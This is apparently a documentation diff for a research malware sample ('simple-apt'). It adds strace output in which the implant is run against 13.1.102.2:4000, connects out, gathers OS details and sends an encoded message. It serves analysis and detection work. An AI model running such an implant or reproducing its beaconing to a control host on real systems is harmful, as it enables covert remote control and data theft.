@@ -198,3 +198,46 @@ logs retained by Unit 61398
     2016-08-11 11:40:56,599           ocMux:133 [ INFO] Lost connection to client
     2016-08-11 11:40:56,599           ocMux:134 [ INFO] Exiting session...
     galaxy1:~/Documents/TransparentComputing/malware/cross-platform/simple-apt/oc1$
+
+
+strace output
+-------------
+
+    $ strace /tmp/simple 13.1.102.2 4000 2> strace.txt
+    ...
+    fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 7), ...}) = 0
+    mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f7cdc8ea000
+    write(1, "[*] Target: 13.1.102.2:4000\n", 28) = 28
+    write(1, "[*] Initializing message subsyst"..., 35) = 35
+    write(1, "[*] Initializing network\n", 25) = 25
+    write(1, "[*] Initializing session\n", 25) = 25
+    open("/tmp/tc-marker-001-begin.txt", O_WRONLY|O_CREAT|O_APPEND, 0644) = 3
+    write(3, ".", 1)                        = 1
+    close(3)                                = 0
+
+    socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 3
+
+    open("/tmp/tc-marker-001-end.txt", O_WRONLY|O_CREAT|O_APPEND, 0644) = 4
+    write(4, ".", 1)                        = 1
+    close(4)                                = 0
+    write(1, "[*] Starting session\n", 21)  = 21
+    open("/tmp/tc-marker-002-begin.txt", O_WRONLY|O_CREAT|O_APPEND, 0644) = 4
+    write(4, ".", 1)                        = 1
+    close(4)                                = 0
+
+    connect(3, {sa_family=AF_INET, sin_port=htons(4000), sin_addr=inet_addr("13.1.102.2")}, 16) = 0
+
+    open("/tmp/tc-marker-002-end.txt", O_WRONLY|O_CREAT|O_APPEND, 0644) = 4
+    write(4, ".", 1)                        = 1
+    close(4)                                = 0
+    write(1, "[*] Getting OS information...\n", 30) = 30
+    uname({sys="Linux", node="hangang", ...}) = 0
+    write(1, "[*] Linux #1 SMP Debian 3.16.7-c"..., 76) = 76
+    write(1, "[*] Encoding message\n", 21)  = 21
+    write(1, "[*] Encoding new connection info"..., 41) = 41
+    brk(0)                                  = 0x1cc8000
+    brk(0x1ce9000)                          = 0x1ce9000
+    write(1, "[*] Sending message of 80 bytes "..., 43) = 43
+    write(1, "[*] Sending data: 95 bytes\n", 27) = 27
+    sendto(3, "\10\350\7\20\0\30\1 \0(e0\0:P\10\241\37\20\2\32\5Linux\"0#1 "..., 95, 0, NULL, 0) = 95
+    ...
